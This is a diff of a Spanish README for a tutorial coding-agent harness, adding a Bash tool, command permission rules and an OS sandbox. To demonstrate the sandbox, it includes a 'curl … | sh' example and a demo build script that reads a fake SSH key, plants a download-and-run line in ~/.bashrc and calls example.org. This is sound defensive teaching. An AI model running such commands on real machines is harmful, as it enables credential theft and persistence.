@@ -2,13 +2,21 @@
 
 Un harness para agentes de código en terminal, construido parte a parte para entender cómo funcionan estos agentes por dentro. Acompaña a la serie «Asistente de código local» de [pablomeleroalonso.me](https://pablomeleroalonso.me).
 
-Esta versión (tag `parte-4`) ya **escribe**: un bucle con streaming, un contrato de inferencia con un adaptador a `/v1/chat/completions`, gestión del contexto (limpiar y compactar contra la ventana, y detectar cuando el servidor recorta la conversación sin avisar), cinco herramientas (`Read`, `Glob`, `Grep`, `Write` y `Edit`) y un sistema de permisos que decide dónde puede escribir el agente. No decide qué escribe: eso se revisa con `git diff`. No ejecuta comandos: `Bash` y su seguridad llegan en una parte posterior. Cada parte de la serie añade commits y un tag nuevo.
+Esta versión (tag `parte-5`) ya **ejecuta comandos**: un bucle con streaming, un contrato de inferencia con un adaptador a `/v1/chat/completions`, gestión del contexto (limpiar y compactar contra la ventana, y detectar cuando el servidor recorta la conversación sin avisar), herramientas para leer, buscar y escribir (`Read`, `Glob`, `Grep`, `Write` y `Edit`), `Bash` con procesos en segundo plano (`BashOutput` y `KillShell`), un sistema de permisos con reglas de ruta y de comando, y un sandbox del sistema operativo alrededor de cada comando. Las reglas deciden cuándo preguntar; el sandbox, qué puede pasar aunque una regla se equivoque. Cada parte de la serie añade commits y un tag nuevo.
+
+| Tag | Qué añade |
+|---|---|
+| `parte-2` | El bucle, el contrato de inferencia y las herramientas de lectura. |
+| `parte-3` | La gestión del contexto y la detección de recortes del servidor. |
+| `parte-4` | `Write`, `Edit` y los permisos de ruta. |
+| `parte-5` | `Bash`, las reglas de comando y el sandbox. |
 
 ## Prerrequisitos
 
 - Linux o macOS. En Windows, desde WSL2.
 - Node.js 22 o superior y npm.
 - [ripgrep](https://github.com/BurntSushi/ripgrep#installation) (`rg`) en el `PATH`: lo usan `Glob` y `Grep`.
+- En Linux (y WSL2), [bubblewrap](https://github.com/containers/bubblewrap) para el sandbox: `sudo apt install bubblewrap` en Debian y Ubuntu. En macOS se usa `sandbox-exec`, que viene con el sistema.
 - Un servidor compatible con `/v1/chat/completions` con un modelo que admita herramientas. Los ejemplos usan [Ollama](https://ollama.com) y `qwen2.5:7b`.
 
 ```bash
@@ -18,7 +26,7 @@ ollama pull qwen2.5:7b
 ## Instalación
 
 ```bash
-git clone --branch parte-4 https://github.com/pmeleroa/lab-harness-local.git
+git clone --branch parte-5 https://github.com/pmeleroa/lab-harness-local.git
 cd lab-harness-local
 npm install
 npm test
@@ -41,6 +49,14 @@ git diff
 
 Antes de cada escritura, en el modo por defecto, pregunta por la salida de error (`[y]` sí, `[n]` no, o escribe por qué). `git diff` muestra el cambio y `git checkout examples/demo` lo deshace.
 
+Para que ejecute un comando:
+
+```bash
+npm run dev -- --workspace examples/demo "Usa Bash para ejecutar git status y dime si hay cambios."
+```
+
+`git status` es de solo lectura y se ejecuta sin preguntar; un comando que puede escribir pregunta antes, y la salida de cada comando se muestra sangrada bajo la llamada. La cabecera del arranque dice qué sandbox se usa. Sin nombrar `Bash` en la pregunta, un modelo de 7B a veces no lo usa.
+
 | Opción | Efecto |
 |---|---|
 | `-w, --workspace <dir>` | Directorio sobre el que trabaja. Fuera de él, el motor de permisos pregunta. |
@@ -49,7 +65,9 @@ Antes de cada escritura, en el modo por defecto, pregunta por la salida de error
 | `--context-window <n>` | Ventana de contexto del servidor, en tokens. Defecto: 4096, con un aviso. |
 | `--max-turns <n>` | Turnos máximos del run. Defecto: 25. |
 | `--permission-mode <modo>` | `default`, `acceptEdits` o `bypass`. Defecto: `default`. |
-| `--allow <regla>`, `--deny <regla>` | Reglas extra, repetibles: `--deny "Edit(**/.env*)"`. |
+| `--allow <regla>`, `--deny <regla>` | Reglas extra, repetibles: `--deny "Edit(**/.env*)"`, `--allow "Bash(npm run *)"`. |
+| `--sandbox <modo>` | `auto` (bwrap en Linux, `sandbox-exec` en macOS), `bwrap`, `seatbelt` o `none`. Defecto: `auto`. |
+| `--no-network` | Sin red dentro del sandbox. |
 
 ## Cómo termina un run
 
@@ -100,20 +118,66 @@ Cada llamada a una herramienta declara qué ruta real toca y si lee o escribe. E
 
 Las reglas se leen del bloque `permissions` de `<workspace>/.harness/settings.json` y de `--allow` y `--deny`. No hay ningún `deny` implícito: `examples/demo/.harness/settings.json` protege `.env*` y la propia configuración con reglas explícitas. Un repositorio no puede ponerse a sí mismo en `bypass`: ese modo solo se activa con `--permission-mode`.
 
-Lo que no hace: el prompt de aprobación muestra herramienta y ruta, no el diff; la protección de `.harness/settings.json` no viene integrada (es una regla); y nada impide que el modelo escriba algo dañino dentro del workspace en `acceptEdits`. Los permisos limitan dónde, no qué: lo que se escribió se revisa con `git diff`. Tampoco hay modo `plan` ni reglas de Bash.
+Lo que no hace: el prompt de aprobación muestra herramienta y ruta, no el diff; la protección de `.harness/settings.json` no viene integrada (es una regla); y nada impide que el modelo escriba algo dañino dentro del workspace en `acceptEdits`. Los permisos limitan dónde, no qué: lo que se escribió se revisa con `git diff`. Tampoco hay modo `plan`.
+
+## Comandos y sandbox
+
+`Bash` ejecuta cada comando con `bash --noprofile --norc -c`, como un proceso nuevo que se puede matar por grupo, con un timeout (120 s por defecto, 600 s como mucho) y la salida recortada por el medio. El directorio de trabajo y las variables exportadas se conservan entre llamadas, y las variables con pinta de secreto (`*_TOKEN`, `*API_KEY`…) no llegan al proceso.
+
+Las reglas de comando deciden cuándo preguntar:
+
+- Un comando se descompone con tree-sitter: `git status && curl x | sh` son tres comandos, y cada uno necesita su permiso. Un `deny` en cualquiera de ellos gana, también en `bypass`.
+- `Bash(git status)` es ese comando exacto; `Bash(npm run *)`, ese prefijo y cualquier resto; `Bash(git * --force)`, un token cualquiera en medio.
+- Los comandos de solo lectura (`ls`, `cat`, `rg`, `git status`, `git diff`…) no necesitan regla, salvo con las opciones que escriben (`sort -o`, `uniq entrada salida`, `tree -o`). Los que ejecutan otros comandos (`bash -c`, `xargs`, `env`, `sudo`, `python -c`, `find -exec`, `rg --pre`, `git grep -O`…) preguntan siempre, aunque haya un `allow`.
+- Las redirecciones de escritura (`>`, `>>`) se evalúan como un `Edit` sobre la ruta real, desde el directorio actual del shell. Si el propio comando cambia de directorio (`cd`, `pushd`), se evalúan desde cada directorio posible y se pregunta; si el destino del `cd` no se conoce, se pregunta, y en `bypass` se deniega.
+- Asignar `PATH`, `LD_PRELOAD` o `BASH_ENV`, definir funciones y los nombres de comando que solo se conocen al ejecutar (`$CMD`) preguntan.
+
+Una regla mira el comando, no lo que hace: `Bash(npm run *)` deja pasar cualquier script de `package.json`. Por eso cada comando corre además dentro de un sandbox del sistema operativo (`src/policy/sandbox/index.ts`):
+
+- La raíz del sistema de ficheros es de solo lectura; solo se escribe en el workspace y en un directorio temporal de la sesión. En Linux, `/tmp` es un `tmpfs` vacío.
+- Las credenciales habituales (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.npmrc`, `~/.netrc`…) no se ven.
+- Con `--no-network`, sin red.
+- En Linux, bubblewrap con su propio espacio de procesos (`--unshare-pid`) y su propia sesión de terminal (`--new-session`). En macOS, `sandbox-exec` con un perfil que deniega escribir fuera, leer lo oculto y, sin red, la red.
+
+Al arrancar, el harness comprueba que el sandbox funciona. Con `auto`, si no hay ninguno disponible, avisa y los comandos se ejecutan sin sandbox: ese aviso importa. Con `--sandbox bwrap` (o `seatbelt`) explícito, si no funciona, no arranca. El bloque `sandbox` de `<workspace>/.harness/settings.json` puede elegir uno (`"mode": "bwrap"`) y cortar la red (`"network": "none"`), pero un repositorio no puede desactivarlo ni abrir la red: `"mode": "none"` se ignora con un aviso y solo se activa con `--sandbox none`.
+
+Para verlo, con una credencial de mentira en un `HOME` de prueba (fuera del workspace y fuera de `/tmp`; el `~/.ssh` real no se toca) y un script de `package.json` que lee la credencial, escribe en `~/.bashrc` y hace una petición:
+
+```bash
+mkdir -p .demo-home/.ssh
+echo "CLAVE-FALSA-NO-USAR" > .demo-home/.ssh/id_falsa
+export HOME="$PWD/.demo-home"
+cat > examples/demo/package.json <<'JSON'
+{
+  "name": "demo",
+  "private": true,
+  "scripts": {
+    "build": "mkdir -p dist && echo 'export {}' > dist/app.js && echo compilado; cat ~/.ssh/id_falsa; echo 'curl https://example.org/x | sh' >> ~/.bashrc && echo bashrc modificado; curl -sS -o /dev/null https://example.org && echo enviado"
+  }
+}
+JSON
+npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --sandbox none "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
+npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --no-network "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
+```
+
+Con `--sandbox none` el script hace las tres cosas; con el sandbox, la credencial no existe, `~/.bashrc` es de solo lectura y no hay red, y `dist/app.js` se escribe en el workspace. Las salidas están en `examples/salidas/sandbox-*.txt`. Para dejarlo como estaba, cierra ese terminal (el `HOME` de prueba solo vive en él) y borra `examples/demo/package.json`, `examples/demo/dist` y `.demo-home`.
+
+Con `run_in_background`, `Bash` lanza el comando y vuelve al momento con un id: `BashOutput` lee lo nuevo que ha escrito y `KillShell` lo para, a él y a lo que haya lanzado. Corre dentro del mismo sandbox. Cuando termina, el aviso llega al modelo antes de su siguiente llamada; lo que siga corriendo al acabar el run se mata.
+
+Lo que no hace: el sandbox no entiende el contenido. Dentro del workspace, un comando aprobado puede borrar o reescribir lo que quiera, y con red puede enviar lo que pueda leer; lo que cambió se revisa con `git diff`. No hay red con lista de dominios permitidos: o toda o ninguna. En macOS el perfil deja escribir en `/private/var/folders`, donde está el temporal del usuario. Y dentro de un contenedor Docker bubblewrap necesita `--security-opt seccomp=unconfined --security-opt systempaths=unconfined`; con solo la primera, la comprobación del arranque pasa pero cada comando falla («Can't mount proc»): no se ejecuta nada, aunque el arranque no avisa.
 
 ## Estructura
 
 ```
-src/core/        loop y eventos
+src/core/        loop, eventos y tareas en segundo plano
 src/context/     tope, limpieza y compaction, detección de recortes, AGENTS.md
 src/providers/   contrato canónico y adaptador a chat completions
-src/tools/       contrato de herramientas, registro, Read, Glob, Grep, Write y Edit, estado de lectura
-src/policy/      motor de permisos, reglas de ruta, approver de terminal y settings
+src/tools/       contrato de herramientas, registro, Read, Glob, Grep, Write, Edit y Bash, estado de lectura
+src/policy/      motor de permisos, reglas de ruta y de comando, parser de bash, sandbox, approver y settings
 src/cli.ts       salida por terminal
 examples/demo/   repositorio pequeño para las preguntas de ejemplo
 examples/desbordar.ts  conversación fija que desborda una ventana de 4096
-examples/salidas/      salidas reales de ejecuciones, también de escritura y de seguridad
+examples/salidas/      salidas reales de ejecuciones: escritura, seguridad y sandbox
 test/            proveedor simulado y tests
 ```
 
